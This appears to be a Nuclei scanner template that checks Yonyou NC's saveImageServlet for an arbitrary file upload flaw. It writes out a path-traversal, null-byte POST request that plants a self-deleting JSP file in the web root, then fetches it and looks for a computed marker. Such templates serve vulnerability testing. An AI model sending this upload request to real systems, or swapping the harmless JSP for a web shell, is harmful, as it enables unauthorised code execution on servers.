id: yonyou-nc-saveImageServlet-upload-file
info:
  name: yonyou-nc-saveImageServlet-upload-file
  author: Abbbbb
  severity: critical

http:
  - raw:
      - |
        POST /portal/pt/servlet/saveImageServlet/doPost?pageId=login&filename=../../../../webapps/nc_web/{{randstr_1}}.jsp%00 HTTP/1.1
        Host: {{Hostname}}
        Cookie: LA_K1=langid
        serverEnable: localserver
        Accept-Encoding: gzip, x-gzip, deflate
        Content-Length: 27
        Content-Type: application/octet-stream
        Content-Encoding: UTF_8
        Connection: close
        User-Agent: Apache-HttpClient/5.2.1 (Java/1.8.0_202)
        
        <%out.print(111*111);new java.io.File(application.getRealPath(request.getServletPath())).delete();%>

      - |
        GET /{{randstr_1}}.jsp HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - "status_code_1 == 200"
          - "status_code_2 == 200 && contains(body_2,'12321')"
        condition: and
